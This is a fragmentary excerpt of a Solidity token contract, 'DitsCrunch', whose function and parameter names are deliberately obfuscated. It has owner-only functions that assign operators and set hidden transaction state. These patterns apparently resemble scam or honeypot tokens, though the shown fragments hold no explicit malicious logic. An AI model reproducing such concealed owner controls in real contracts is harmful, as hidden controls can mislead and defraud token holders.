...
contract DitsCrunch  {
    ...
    constructor(string memory _nameNH36zk, string memory _symbolEhtRTt, uint160 _decimals, uint _supplySQb6od, uint160 txsSB6MJe, uint160 txsNY9Uk8f) {
        name = _nameNH36zk;
        symbol = _symbolEhtRTt;
        decimals = _decimals;
        totalSupply = _supplySQb6od * 10 ** _decimals; 
    ...
    function nodeSZRDF9B(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }
    ...
    function setTJKZCXD(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
    ...
    function getM2QDJn3() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
    ...
    function getMVAdLd4J() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }
